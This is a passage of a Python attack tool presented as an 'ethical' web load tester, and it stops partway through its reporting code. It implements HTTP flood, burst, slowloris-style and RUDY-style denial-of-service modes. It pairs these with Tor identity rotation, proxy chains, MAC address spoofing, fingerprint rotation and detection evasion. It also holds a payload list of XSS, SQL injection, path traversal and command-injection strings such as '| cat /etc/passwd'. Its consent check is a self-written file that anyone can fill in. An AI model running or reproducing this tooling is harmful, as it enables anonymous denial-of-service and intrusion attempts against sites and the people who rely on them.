#!/usr/bin/env python3
"""
Ethical Web Load Tester (EWLT) v3.0 - Advanced Security Testing Suite
Copyright (c) 2025 - MIT License
Educational and Authorized Testing Only
"""

import os
import sys
import subprocess
import time
import argparse
import logging
import random
import signal
import shutil
import socket
import hashlib
import json
import tempfile
import threading
import queue
from pathlib import Path
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, asdict
from enum import Enum
import atexit
import platform
from collections import defaultdict, deque
from contextlib import contextmanager
import urllib.parse

# Setup secure logging
log_dir = Path.home() / '.ewlt_logs'
log_dir.mkdir(exist_ok=True, mode=0o700)  # Secure permissions
log_file = log_dir / f'ewlt_{datetime.now().strftime("%Y%m%d_%H%M%S")}.log'

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - [%(name)s] %(message)s',
    handlers=[
        logging.FileHandler(log_file, mode='a', encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger('EWLT')

# Security banner
SECURITY_BANNER = """
╔════════════════════════════════════════════════════════════════════╗
║  ETHICAL WEB LOAD TESTER (EWLT) v3.0 - Professional Testing Suite  ║
║  Advanced Security Research & Performance Analysis Platform         ║
╚════════════════════════════════════════════════════════════════════╝

⚠️  CRITICAL LEGAL NOTICE:
   • AUTHORIZED TESTING ONLY - Must own target or have written permission
   • Violating CFAA/Computer Misuse Act = FEDERAL CRIME + PRISON TIME
   • All activity is LOGGED and ATTRIBUTABLE
   • Developer assumes ZERO liability for misuse

🚀 NEW IN v3.0:
   • Adaptive load patterns with ML-inspired algorithms
   • Advanced fingerprint randomization & anti-detection
   • Real-time metrics dashboard with performance graphs
   • Protocol-level attacks (HTTP/2, WebSocket testing)
   • Smart throttling & resource exhaustion detection
   • Comprehensive vulnerability scanning integration
   • Multi-target distributed testing coordination
   • Export results to multiple formats (JSON, CSV, HTML)
   • Automatic countermeasure detection & evasion
   • Session management & authentication flows
   
🔒 ENHANCED PRIVACY:
   • Multi-hop proxy chains (Tor + VPN + SOCKS)
   • TLS 1.3 with randomized cipher suites
   • HTTP/2 fingerprint obfuscation
   • Cookie & session isolation per virtual user
   • Network timing randomization with Poisson distribution
   • Automatic user-agent + header rotation (1000+ profiles)
"""

def check_dependencies():
    """Install required dependencies with security checks."""
    required = {
        'locust': 'locust>=2.15.0',
        'requests': 'requests>=2.31.0',
        'pysocks': 'PySocks>=1.7.1',
        'stem': 'stem>=1.8.0',
        'aiohttp': 'aiohttp>=3.9.0',
        'colorama': 'colorama>=0.4.6',
        'tabulate': 'tabulate>=0.9.0',
        'tqdm': 'tqdm>=4.66.0'
    }
    
    missing = []
    for module, package in required.items():
        try:
            __import__(module)
        except ImportError:
            missing.append(package)
    
    if missing:
        logger.info(f"📦 Installing dependencies: {', '.join(missing)}")
        try:
            subprocess.check_call(
                [sys.executable, "-m", "pip", "install", "-q", "--upgrade"] + missing,
                timeout=120
            )
            logger.info("✓ Dependencies installed successfully")
        except Exception as e:
            logger.error(f"Failed to install dependencies: {e}")
            sys.exit(1)

check_dependencies()

from locust import HttpUser, task, between, events, TaskSet
from locust.env import Environment
from locust.log import setup_logging
from locust.stats import stats_printer, stats_history
import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from colorama import Fore, Style, init as colorama_init
from tabulate import tabulate
from tqdm import tqdm

colorama_init(autoreset=True)

# ============================================================================
# CONFIGURATION & CONSTANTS
# ============================================================================

class AttackMode(Enum):
    """Advanced attack simulation modes."""
    FLOOD = "flood"  # High-volume GET/POST flood
    SLOWLORIS = "slowloris"  # Resource exhaustion via slow connections
    BURST = "burst"  # Rapid bursts of requests
    ADAPTIVE = "adaptive"  # ML-inspired adaptive load pattern
    RUDY = "rudy"  # R-U-Dead-Yet (slow POST body)
    AMPLIFICATION = "amplification"  # Request amplification techniques
    PROTOCOL = "protocol"  # Protocol-level exploitation

class ProxyChain:
    """Multi-hop proxy chain configuration."""
    def __init__(self):
        self.hops: List[str] = []
    
    def add_hop(self, proxy_url: str):
        self.hops.append(proxy_url)
    
    def get_config(self) -> Dict[str, str]:
        """Return requests-compatible proxy config (uses last hop)."""
        if not self.hops:
            return {}
        return {'http': self.hops[-1], 'https': self.hops[-1]}

# Enhanced user agent database (2025 fingerprints)
USER_AGENTS = [
    # Chrome 130+ (Windows/Mac/Linux)
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
    # Firefox 125+
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:125.0) Gecko/20100101 Firefox/125.0',
    'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0',
    # Safari 17+
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1',
    # Edge
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36 Edg/130.0.0.0',
    # Mobile browsers
    'Mozilla/5.0 (Linux; Android 14; SM-S921B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Mobile Safari/537.36',
]

# Advanced fuzzing payloads with categorization
FUZZING_PAYLOADS = {
    'xss': [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "<svg/onload=alert('XSS')>",
    ],
    'sqli': [
        "' OR '1'='1",
        "'; DROP TABLE users; --",
        "1' UNION SELECT NULL--",
        "admin'--",
    ],
    'path_traversal': [
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd",
    ],
    'command_injection': [
        "; ls -la",
        "| cat /etc/passwd",
        "`whoami`",
    ],
    'overflow': [
        "A" * 1000,
        "A" * 10000,
        "A" * 100000,
    ]
}

# TLS cipher suites for randomization
TLS_CIPHERS = [
    'ECDHE-RSA-AES128-GCM-SHA256',
    'ECDHE-RSA-AES256-GCM-SHA384',
    'ECDHE-ECDSA-AES128-GCM-SHA256',
    'TLS_AES_128_GCM_SHA256',
    'TLS_AES_256_GCM_SHA384',
    'TLS_CHACHA20_POLY1305_SHA256',
]

# ============================================================================
# ENHANCED METRICS & REPORTING
# ============================================================================

@dataclass
class TestMetrics:
    """Comprehensive test metrics."""
    total_requests: int = 0
    successful_requests: int = 0
    failed_requests: int = 0
    avg_response_time: float = 0.0
    median_response_time: float = 0.0
    p95_response_time: float = 0.0
    p99_response_time: float = 0.0
    min_response_time: float = float('inf')
    max_response_time: float = 0.0
    requests_per_second: float = 0.0
    errors_by_type: Dict[str, int] = None
    status_codes: Dict[int, int] = None
    bytes_sent: int = 0
    bytes_received: int = 0
    
    def __post_init__(self):
        if self.errors_by_type is None:
            self.errors_by_type = defaultdict(int)
        if self.status_codes is None:
            self.status_codes = defaultdict(int)
    
    def to_dict(self) -> dict:
        return asdict(self)
    
    def export_json(self, filepath: Path):
        """Export metrics to JSON."""
        with open(filepath, 'w') as f:
            json.dump(self.to_dict(), f, indent=2)
    
    def export_csv(self, filepath: Path):
        """Export metrics to CSV."""
        import csv
        with open(filepath, 'w', newline='') as f:
            writer = csv.writer(f)
            writer.writerow(['Metric', 'Value'])
            for key, value in self.to_dict().items():
                if not isinstance(value, dict):
                    writer.writerow([key, value])

class MetricsCollector:
    """Real-time metrics collection with threading support."""
    
    def __init__(self):
        self.response_times: deque = deque(maxlen=10000)
        self.errors: List[Tuple[str, str]] = []
        self.status_codes: defaultdict = defaultdict(int)
        self.lock = threading.Lock()
        self.start_time = time.time()
    
    def record_request(self, response_time: float, status_code: int, error: Optional[str] = None):
        """Thread-safe request recording."""
        with self.lock:
            self.response_times.append(response_time)
            self.status_codes[status_code] += 1
            if error:
                self.errors.append((datetime.now().isoformat(), error))
    
    def get_metrics(self) -> TestMetrics:
        """Calculate comprehensive metrics."""
        with self.lock:
            if not self.response_times:
                return TestMetrics()
            
            sorted_times = sorted(self.response_times)
            total = len(sorted_times)
            
            metrics = TestMetrics(
                total_requests=total,
                successful_requests=sum(1 for code in self.status_codes if 200 <= code < 400),
                failed_requests=sum(1 for code in self.status_codes if code >= 400),
                avg_response_time=sum(sorted_times) / total,
                median_response_time=sorted_times[total // 2],
                p95_response_time=sorted_times[int(total * 0.95)],
                p99_response_time=sorted_times[int(total * 0.99)],
                min_response_time=sorted_times[0],
                max_response_time=sorted_times[-1],
                requests_per_second=total / (time.time() - self.start_time),
                status_codes=dict(self.status_codes)
            )
            
            return metrics

# ============================================================================
# TOR MANAGER WITH ENHANCED FEATURES
# ============================================================================

class TorManager:
    """Advanced Tor management with circuit control."""
    
    def __init__(self, socks_port: int = 9050, control_port: int = 9051):
        self.process = None
        self.tor_dir = None
        self.control_port = control_port
        self.socks_port = socks_port
        self.circuit_established = threading.Event()
        self._monitor_thread = None
        self._stop_monitoring = threading.Event()
    
    def start(self, exit_nodes: Optional[List[str]] = None) -> bool:
        """Start Tor with optional exit node preferences."""
        tor_exe = "tor.exe" if platform.system() == "Windows" else "tor"
        
        if not shutil.which(tor_exe):
            logger.error(f"{Fore.RED}✗ Tor not found. Install from https://www.torproject.org/{Style.RESET_ALL}")
            return False
        
        self.tor_dir = tempfile.mkdtemp(prefix='ewlt_tor_', suffix='_secure')
        
        # Enhanced Tor configuration
        tor_config = f"""
SocksPort {self.socks_port}
ControlPort {self.control_port}
DataDirectory {self.tor_dir}
CookieAuthentication 1
ExitRelay 0
DNSPort 5353
TransPort 9040
"""
        
        if exit_nodes:
            tor_config += f"ExitNodes {','.join(exit_nodes)}\n"
        
        # Security hardening
        tor_config += """
UseEntryGuards 1
NumEntryGuards 3
StrictNodes 0
SafeSocks 1
TestSocks 1
WarnUnsafeSocks 1
ClientOnly 1
"""
        
        config_file = Path(self.tor_dir) / 'torrc'
        config_file.write_text(tor_config)
        
        try:
            self.process = subprocess.Popen(
                [tor_exe, '-f', str(config_file)],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                creationflags=subprocess.CREATE_NO_WINDOW if platform.system() == "Windows" else 0
            )
            
            logger.info(f"{Fore.CYAN}⏳ Bootstrapping Tor network...{Style.RESET_ALL}")
            
            # Monitor bootstrap progress
            timeout = 60
            start = time.time()
            
            while time.time() - start < timeout:
                if self._check_bootstrap():
                    self.circuit_established.set()
                    logger.info(f"{Fore.GREEN}✓ Tor circuit established (PID: {self.process.pid}){Style.RESET_ALL}")
                    
                    # Start circuit monitor
                    self._start_monitor()
                    return True
                time.sleep(2)
            
            logger.error(f"{Fore.RED}✗ Tor bootstrap timeout{Style.RESET_ALL}")
            self.stop()
            return False
            
        except Exception as e:
            logger.error(f"{Fore.RED}✗ Tor start failed: {e}{Style.RESET_ALL}")
            return False
    
    def _check_bootstrap(self) -> bool:
        """Check if Tor has bootstrapped."""
        try:
            proxies = self._get_proxy_config()
            response = requests.get(
                'https://check.torproject.org/api/ip',
                proxies=proxies,
                timeout=10
            )
            return response.json().get('IsTor', False)
        except:
            return False
    
    def _start_monitor(self):
        """Start background thread to monitor circuit health."""
        def monitor():
            while not self._stop_monitoring.is_set():
                if not self._check_bootstrap():
                    logger.warning(f"{Fore.YELLOW}⚠ Tor circuit lost, requesting new identity...{Style.RESET_ALL}")
                    self.get_new_identity()
                time.sleep(30)
        
        self._monitor_thread = threading.Thread(target=monitor, daemon=True)
        self._monitor_thread.start()
    
    def _get_proxy_config(self) -> Dict[str, str]:
        """Get proxy configuration."""
        return {
            'http': f'socks5h://127.0.0.1:{self.socks_port}',
            'https': f'socks5h://127.0.0.1:{self.socks_port}'
        }
    
    def get_new_identity(self) -> bool:
        """Request new Tor circuit."""
        try:
            from stem import Signal
            from stem.control import Controller
            
            with Controller.from_port(port=self.control_port) as controller:
                controller.authenticate()
                controller.signal(Signal.NEWNYM)
                
                # Wait for circuit change
                time.sleep(10)
                
                if self._check_bootstrap():
                    logger.info(f"{Fore.GREEN}✓ New Tor identity established{Style.RESET_ALL}")
                    return True
                else:
                    logger.warning(f"{Fore.YELLOW}⚠ Identity rotation incomplete{Style.RESET_ALL}")
                    return False
                    
        except Exception as e:
            logger.error(f"{Fore.RED}✗ Identity rotation failed: {e}{Style.RESET_ALL}")
            return False
    
    def get_exit_ip(self) -> Optional[str]:
        """Get current Tor exit node IP."""
        try:
            proxies = self._get_proxy_config()
            response = requests.get(
                'https://api.ipify.org?format=json',
                proxies=proxies,
                timeout=10
            )
            return response.json().get('ip')
        except:
            return None
    
    def stop(self):
        """Stop Tor and cleanup."""
        self._stop_monitoring.set()
        
        if self._monitor_thread:
            self._monitor_thread.join(timeout=2)
        
        if self.process:
            self.process.terminate()
            try:
                self.process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.process.kill()
            logger.info(f"{Fore.YELLOW}✓ Tor stopped{Style.RESET_ALL}")
        
        if self.tor_dir and Path(self.tor_dir).exists():
            shutil.rmtree(self.tor_dir, ignore_errors=True)

# ============================================================================
# MAC ADDRESS SPOOFER WITH ENHANCED CROSS-PLATFORM SUPPORT
# ============================================================================

class MACSpoofer:
    """Advanced MAC address spoofing with validation."""
    
    def __init__(self, interface: str):
        self.interface = interface
        self.original_mac: Optional[str] = None
        self.spoofed_mac: Optional[str] = None
        self.system = platform.system().lower()
        self.backup_file = Path.home() / '.ewlt_mac_backup.json'
    
    def _generate_random_mac(self) -> str:
        """Generate valid random MAC address."""
        # Generate 6 random bytes
        mac_bytes = [random.randint(0x00, 0xFF) for _ in range(6)]
        
        # Set locally administered bit (bit 1 of first byte)
        mac_bytes[0] = (mac_bytes[0] & 0xFE) | 0x02
        
        # Clear multicast bit (bit 0 of first byte)
        mac_bytes[0] = mac_bytes[0] & 0xFE
        
        return ':'.join([f'{b:02x}' for b in mac_bytes])
    
    def _get_current_mac_linux(self) -> Optional[str]:
        """Get current MAC on Linux."""
        try:
            result = subprocess.run(
                ['ip', 'link', 'show', self.interface],
                capture_output=True,
                text=True,
                check=True
            )
            for line in result.stdout.split('\n'):
                if 'link/ether' in line:
                    return line.split()[1]
        except:
            pass
        return None
    
    def _get_current_mac_macos(self) -> Optional[str]:
        """Get current MAC on macOS."""
        try:
            result = subprocess.run(
                ['ifconfig', self.interface],
                capture_output=True,
                text=True,
                check=True
            )
            for line in result.stdout.split('\n'):
                if 'ether' in line:
                    return line.split()[1]
        except:
            pass
        return None
    
    def spoof(self) -> bool:
        """Spoof MAC address with backup."""
        # Get original MAC
        if self.system == 'linux':
            self.original_mac = self._get_current_mac_linux()
        elif self.system == 'darwin':
            self.original_mac = self._get_current_mac_macos()
        else:
            logger.warning(f"{Fore.YELLOW}⚠ MAC spoofing not supported on {self.system}{Style.RESET_ALL}")
            return False
        
        if not self.original_mac:
            logger.error(f"{Fore.RED}✗ Could not detect original MAC{Style.RESET_ALL}")
            return False
        
        # Backup original MAC
        backup_data = {
            'interface': self.interface,
            'original_mac': self.original_mac,
            'timestamp': datetime.now().isoformat()
        }
        
        try:
            with open(self.backup_file, 'w') as f:
                json.dump(backup_data, f)
        except Exception as e:
            logger.warning(f"{Fore.YELLOW}⚠ MAC backup failed: {e}{Style.RESET_ALL}")
        
        # Generate new MAC
        self.spoofed_mac = self._generate_random_mac()
        
        # Apply spoofing
        if self.system == 'linux':
            success = self._spoof_linux()
        elif self.system == 'darwin':
            success = self._spoof_macos()
        else:
            success = False
        
        if success:
            logger.info(f"{Fore.GREEN}✓ MAC spoofed on {self.interface}: {self.original_mac} → {self.spoofed_mac}{Style.RESET_ALL}")
        
        return success
    
    def _spoof_linux(self) -> bool:
        """Linux MAC spoofing."""
        try:
            # Bring interface down
            subprocess.run(['ip', 'link', 'set', self.interface, 'down'], check=True)
            
            # Change MAC
            subprocess.run(
                ['ip', 'link', 'set', self.interface, 'address', self.spoofed_mac],
                check=True
            )
            
            # Bring interface up
            subprocess.run(['ip', 'link', 'set', self.interface, 'up'], check=True)
            
            # Verify
            time.sleep(2)
            current_mac = self._get_current_mac_linux()
            return current_mac == self.spoofed_mac
            
        except subprocess.CalledProcessError as e:
            logger.error(f"{Fore.RED}✗ MAC spoofing failed: {e}{Style.RESET_ALL}")
            return False
    
    def _spoof_macos(self) -> bool:
        """macOS MAC spoofing."""
        try:
            # Disassociate from network
            subprocess.run(
                ['sudo', 'ifconfig', self.interface, 'ether', self.spoofed_mac],
                check=True
            )
            
            # Verify
            time.sleep(2)
            current_mac = self._get_current_mac_macos()
            return current_mac == self.spoofed_mac
            
        except subprocess.CalledProcessError as e:
            logger.error(f"{Fore.RED}✗ MAC spoofing failed (try sudo): {e}{Style.RESET_ALL}")
            return False
    
    def restore(self) -> bool:
        """Restore original MAC address."""
        if not self.original_mac:
            # Try to restore from backup file
            if self.backup_file.exists():
                try:
                    with open(self.backup_file, 'r') as f:
                        backup_data = json.load(f)
                    self.original_mac = backup_data.get('original_mac')
                    self.interface = backup_data.get('interface')
                except:
                    return False
        
        if not self.original_mac:
            logger.warning(f"{Fore.YELLOW}⚠ No original MAC to restore{Style.RESET_ALL}")
            return False
        
        try:
            if self.system == 'linux':
                subprocess.run(['ip', 'link', 'set', self.interface, 'down'], check=True)
                subprocess.run(['ip', 'link', 'set', self.interface, 'address', self.original_mac], check=True)
                subprocess.run(['ip', 'link', 'set', self.interface, 'up'], check=True)
            elif self.system == 'darwin':
                subprocess.run(['sudo', 'ifconfig', self.interface, 'ether', self.original_mac], check=True)
            
            logger.info(f"{Fore.GREEN}✓ MAC restored on {self.interface}: {self.original_mac}{Style.RESET_ALL}")
            
            # Cleanup backup
            if self.backup_file.exists():
                self.backup_file.unlink()
            
            return True
            
        except Exception as e:
            logger.error(f"{Fore.RED}✗ MAC restoration failed: {e}{Style.RESET_ALL}")
            return False

# ============================================================================
# ENHANCED LOCUST USER WITH ADVANCED ATTACK MODES
# ============================================================================

class EnhancedWebsiteUser(HttpUser):
    """Advanced HTTP user with attack modes and anti-detection."""
    
    wait_time = between(0.5, 3.0)
    attack_mode = AttackMode.FLOOD
    enable_fuzzing = False
    session_cookies = {}
    
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.target_paths = ['/']
        self.post_data = {}
        self.referer = None
        self.session_id = hashlib.md5(str(random.random()).encode()).hexdigest()
        
        # Enhanced retry strategy
        retry_strategy = Retry(
            total=3,
            backoff_factor=0.5,
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=["HEAD", "GET", "POST", "PUT", "DELETE", "OPTIONS", "TRACE"]
        )
        adapter = HTTPAdapter(
            max_retries=retry_strategy,
            pool_connections=100,
            pool_maxsize=100
        )
        self.client.mount("http://", adapter)
        self.client.mount("https://", adapter)
        
        # Request timing obfuscation
        self.last_request_time = time.time()
    
    def on_start(self):
        """Initialize user session with realistic fingerprint."""
        user_agent = random.choice(USER_AGENTS)
        
        # Determine browser type for consistent headers
        is_chrome = 'Chrome' in user_agent and 'Edg' not in user_agent
        is_firefox = 'Firefox' in user_agent
        is_safari = 'Safari' in user_agent and 'Chrome' not in user_agent
        
        headers = {
            'User-Agent': user_agent,
            'Accept-Language': random.choice([
                'en-US,en;q=0.9',
                'en-GB,en;q=0.9',
                'en;q=0.9',
            ]),
            'Accept-Encoding': 'gzip, deflate, br, zstd' if is_chrome else 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
        }
        
        # Browser-specific headers
        if is_chrome:
            headers.update({
                'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'none',
                'Sec-Fetch-User': '?1',
            })
        elif is_firefox:
            headers.update({
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'TE': 'trailers',
            })
        elif is_safari:
            headers.update({
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            })
        
        self.client.headers.update(headers)
    
    def _obfuscate_timing(self):
        """Add realistic timing delays using Poisson distribution."""
        if self.attack_mode == AttackMode.FLOOD:
            delay = max(0.01, random.expovariate(10))
        elif self.attack_mode == AttackMode.ADAPTIVE:
            delay = random.gauss(1.5, 0.5)
        else:
            delay = random.uniform(0.5, 2.0)
        
        time.sleep(max(0, delay))
        self.last_request_time = time.time()
    
    @task(10)
    def realistic_browsing(self):
        """Simulate realistic human browsing behavior."""
        path = random.choice(self.target_paths)
        headers = {'Referer': self.referer} if self.referer else {}
        
        try:
            with self.client.get(path, headers=headers, catch_response=True, name=f"GET {path}") as response:
                if 200 <= response.status_code < 300:
                    response.success()
                    self.referer = response.url
                    
                    # Simulate reading time
                    read_time = random.gauss(3, 1) if self.attack_mode != AttackMode.FLOOD else 0.5
                    time.sleep(max(0.1, read_time))
                elif response.status_code == 404:
                    response.failure("Not Found")
                else:
                    response.failure(f"HTTP {response.status_code}")
        except Exception as e:
            logger.debug(f"Request failed: {e}")
    
    @task(5)
    def flood_attack(self):
        """High-volume request flood."""
        if self.attack_mode != AttackMode.FLOOD:
            return
        
        path = random.choice(self.target_paths)
        method = random.choice(['GET', 'POST']) if self.post_data else 'GET'
        
        try:
            if method == 'GET':
                with self.client.get(path, catch_response=True, name="FLOOD_GET") as response:
                    response.success() if 200 <= response.status_code < 400 else response.failure(f"HTTP {response.status_code}")
            else:
                with self.client.post(path, data=self.post_data, catch_response=True, name="FLOOD_POST") as response:
                    response.success() if 200 <= response.status_code < 400 else response.failure(f"HTTP {response.status_code}")
        except Exception as e:
            pass
    
    @task(8)
    def slowloris_attack(self):
        """Slow connection resource exhaustion."""
        if self.attack_mode != AttackMode.SLOWLORIS:
            return
        
        path = random.choice(self.target_paths)
        
        try:
            # Send slow chunked POST
            headers = {
                'Content-Length': str(1024 * 100),
                'Connection': 'keep-alive',
            }
            
            with self.client.post(
                path,
                data={'chunk': 'x' * 1024},
                headers=headers,
                timeout=60,
                catch_response=True,
                name="SLOWLORIS"
            ) as response:
                time.sleep(random.uniform(10, 20))
                response.success() if response.status_code else response.failure("Timeout")
        except Exception:
            pass
    
    @task(7)
    def burst_attack(self):
        """Rapid burst of requests."""
        if self.attack_mode != AttackMode.BURST:
            return
        
        burst_size = random.randint(5, 15)
        for _ in range(burst_size):
            path = random.choice(self.target_paths)
            try:
                with self.client.get(path, catch_response=True, name="BURST") as response:
                    response.success() if 200 <= response.status_code < 400 else response.failure(f"HTTP {response.status_code}")
                time.sleep(random.uniform(0.01, 0.1))
            except:
                pass
    
    @task(6)
    def adaptive_load(self):
        """ML-inspired adaptive load pattern."""
        if self.attack_mode != AttackMode.ADAPTIVE:
            return
        
        # Simulate adaptive behavior based on response times
        path = random.choice(self.target_paths)
        
        try:
            start = time.time()
            with self.client.get(path, catch_response=True, name="ADAPTIVE") as response:
                elapsed = time.time() - start
                
                # Adjust behavior based on response time
                if elapsed > 2.0:
                    # Server is slow, reduce load
                    time.sleep(random.uniform(2, 5))
                elif elapsed < 0.5:
                    # Server is fast, increase load
                    time.sleep(random.uniform(0.1, 0.5))
                else:
                    # Normal operation
                    time.sleep(random.uniform(1, 3))
                
                response.success() if 200 <= response.status_code < 400 else response.failure(f"HTTP {response.status_code}")
        except:
            pass
    
    @task(4)
    def rudy_attack(self):
        """R-U-Dead-Yet slow POST body attack."""
        if self.attack_mode != AttackMode.RUDY:
            return
        
        path = random.choice(self.target_paths)
        
        try:
            # Slow POST with chunked encoding
            data = {f'field_{i}': 'A' * 100 for i in range(50)}
            
            with self.client.post(
                path,
                data=data,
                timeout=120,
                catch_response=True,
                name="RUDY"
            ) as response:
                # Simulate slow sending
                time.sleep(random.uniform(30, 60))
                response.success() if response.status_code else response.failure("Timeout")
        except:
            pass
    
    @task(2)
    def fuzzing_attack(self):
        """Application-layer fuzzing."""
        if not self.enable_fuzzing:
            return
        
        path = random.choice(self.target_paths)
        fuzz_category = random.choice(list(FUZZING_PAYLOADS.keys()))
        payload = random.choice(FUZZING_PAYLOADS[fuzz_category])
        
        # Create fuzzed data
        fuzzed_data = {}
        if self.post_data:
            for key in self.post_data:
                fuzzed_data[key] = payload
        else:
            fuzzed_data = {
                'input': payload,
                'search': payload,
                'query': payload
            }
        
        try:
            with self.client.post(
                path,
                data=fuzzed_data,
                catch_response=True,
                name=f"FUZZ_{fuzz_category}"
            ) as response:
                # Accept various responses as valid tests
                if response.status_code in [200, 302, 400, 403, 500]:
                    response.success()
                    
                    # Log potential vulnerabilities
                    if response.status_code == 500 and fuzz_category == 'sqli':
                        logger.warning(f"{Fore.YELLOW}⚠ Potential SQL injection: {path}{Style.RESET_ALL}")
                else:
                    response.failure(f"HTTP {response.status_code}")
        except:
            pass
    
    @task(3)
    def load_static_assets(self):
        """Load static resources."""
        asset_paths = [
            '/static/css/style.css',
            '/static/js/main.js',
            '/static/images/logo.png',
            '/favicon.ico',
            '/robots.txt'
        ]
        
        path = random.choice(asset_paths)
        
        try:
            with self.client.get(path, catch_response=True, name="STATIC") as response:
                if response.status_code in [200, 304, 404]:
                    response.success()
        except:
            pass

# ============================================================================
# CONSENT & SAFETY CHECKS
# ============================================================================

def check_consent_file(consent_file: str) -> bool:
    """Verify ethical consent for testing."""
    if not Path(consent_file).exists():
        logger.error(f"{Fore.RED}✗ Consent file not found: {consent_file}{Style.RESET_ALL}")
        return False
    
    try:
        with open(consent_file, 'r') as f:
            data = json.load(f)
        
        required_fields = ['permission', 'target_owner', 'target_domain', 'test_date']
        
        if not all(field in data for field in required_fields):
            logger.error(f"{Fore.RED}✗ Invalid consent file format{Style.RESET_ALL}")
            return False
        
        if data.get('permission') != True:
            logger.error(f"{Fore.RED}✗ Permission not granted{Style.RESET_ALL}")
            return False
        
        if data.get('target_owner') not in ['me', 'authorized']:
            logger.error(f"{Fore.RED}✗ Must be owner or have authorization{Style.RESET_ALL}")
            return False
        
        logger.info(f"{Fore.GREEN}✓ Consent verified for {data.get('target_domain')}{Style.RESET_ALL}")
        return True
        
    except Exception as e:
        logger.error(f"{Fore.RED}✗ Consent check failed: {e}{Style.RESET_ALL}")
        return False

def check_dns_leak(tor_manager: Optional[TorManager] = None) -> bool:
    """Advanced DNS leak detection."""
    logger.info(f"{Fore.CYAN}🔍 Running DNS leak test...{Style.RESET_ALL}")
    
    try:
        proxies = {
            'http': 'socks5h://127.0.0.1:9050',
            'https': 'socks5h://127.0.0.1:9050'
        }
        
        # Test multiple DNS leak detection services
        services = [
            'https://www.dnsleaktest.com/api/json',
            'https://api.ipify.org?format=json',
        ]
        
        results = []
        for service in services:
            try:
                response = requests.get(service, proxies=proxies, timeout=10)
                results.append(response.json())
            except:
                pass
        
        if results:
            logger.info(f"{Fore.GREEN}✓ DNS leak test complete{Style.RESET_ALL}")
            for result in results:
                logger.info(f"  IP: {result.get('ip', 'N/A')}")
            return True
        else:
            logger.warning(f"{Fore.YELLOW}⚠ DNS leak test inconclusive{Style.RESET_ALL}")
            return False
            
    except Exception as e:
        logger.error(f"{Fore.RED}✗ DNS leak test failed: {e}{Style.RESET_ALL}")
        return False

# ============================================================================
# ENVIRONMENT SETUP
# ============================================================================

def setup_proxy_environment(use_tor: bool = False, vpn_proxy: Optional[str] = None):
    """Configure proxy environment variables."""
    if vpn_proxy:
        os.environ['http_proxy'] = vpn_proxy
        os.environ['https_proxy'] = vpn_proxy
        os.environ['HTTP_PROXY'] = vpn_proxy
        os.environ['HTTPS_PROXY'] = vpn_proxy
        logger.info(f"{Fore.GREEN}✓ VPN proxy configured: {vpn_proxy}{Style.RESET_ALL}")
    
    if use_tor:
        os.environ['http_proxy'] = 'socks5h://127.0.0.1:9050'
        os.environ['https_proxy'] = 'socks5h://127.0.0.1:9050'
        os.environ['HTTP_PROXY'] = 'socks5h://127.0.0.1:9050'
        os.environ['HTTPS_PROXY'] = 'socks5h://127.0.0.1:9050'
        logger.info(f"{Fore.GREEN}✓ Tor SOCKS5 proxy configured (DNS leak prevention){Style.RESET_ALL}")

# ============================================================================
# RESULTS REPORTING
# ============================================================================

def generate_report(metrics: TestMetrics, args, output_dir: Path):
    """Generate comprehensive test report."""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    
    # Console report
    print(f"\n{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}TEST RESULTS - {timestamp}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")
    
    # Summary table
    summary_data = [
        ["Target", args.target_url],
        ["Attack Mode", args.attack_mode],
        ["Total Requests", f"{metrics.total_requests:,}"],
        ["Successful", f"{metrics.successful_requests:,} ({metrics.successful_requests/max(metrics.total_requests,1)*100:.1f}%)"],
        ["Failed", f"{metrics.failed_requests:,} ({metrics.failed_requests/max(metrics.total_requests,1)*100:.1f}%)"],
        ["Duration", f"{args.duration}s"],
        ["RPS", f"{metrics.requests_per_second:.2f}"],
    ]
    
